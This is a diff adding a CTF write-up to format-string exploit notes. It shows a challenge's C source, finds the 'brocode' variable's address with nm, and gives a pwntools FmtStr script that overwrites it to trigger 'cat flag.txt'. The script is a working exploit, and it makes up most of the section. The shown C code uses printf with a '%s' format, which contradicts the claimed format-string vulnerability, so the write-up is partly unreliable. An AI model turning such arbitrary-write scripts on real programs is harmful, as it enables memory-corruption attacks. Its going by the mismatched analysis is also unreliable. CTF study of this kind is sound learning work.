@@ -1,4 +1,68 @@
 # Format String Exploits
+## BCS CTF (Read My Format)
+```c
+void blackbox(char *input) {
+    printf("%s", input);
+    if (brocode == 0x4adf070f) {
+        system("cat flag.txt");
+    } else {
+        puts("You cannot enter as brocode");
+    }
+}
+
+int main(void) {
+    char name[1048];
+
+    printf("Enter name: ");
+    fgets(name, sizeof(name), stdin);
+
+    blackbox(name);
+
+}
+
+```
+so we can see that if the ``` brocode == 0x4adf070f``` it will cat the flag.txt here is our job is to overwrite the ```brocode```'s address with ```0x4adf070f```
+
+lets find the current address of ```brocode``` 
+
+
+```
+$ nm ./read_me | grep brocode
+0804c030 B brocode
+
+```
+
+so here we go  here is the script to do the rest
+
+```py
+from pwn import *
+
+context.arch = "i386"
+
+
+def send_payload(payload):
+
+    # r = remote(HOST, PORT)
+    r = process(["./read_me"])
+    
+    log.info("payload = %s" % repr(payload))
+    r.sendlineafter(b"Enter name: ", payload)
+    out = r.recvline()
+    log.info("received: %s" % r.recvline().decode())
+    
+
+    r.close()
+    return out
+
+
+format_string = FmtStr(execute_fmt=send_payload)
+
+# Use the format string object to write the value 0x4ADF070F to the address 0x0804C030
+format_string.write(0x0804C030, 0x4ADF070F)
+
+format_string.execute_writes()
+```
+![image](https://github.com/user-attachments/assets/aa9200f3-9173-41e8-b729-2a1cddf3f8cf)
 
 
 
@@ -91,14 +155,6 @@ r.interactive()
 r.close()
 
 ```
-
-
-
-
-
-
-
-
 
 
 
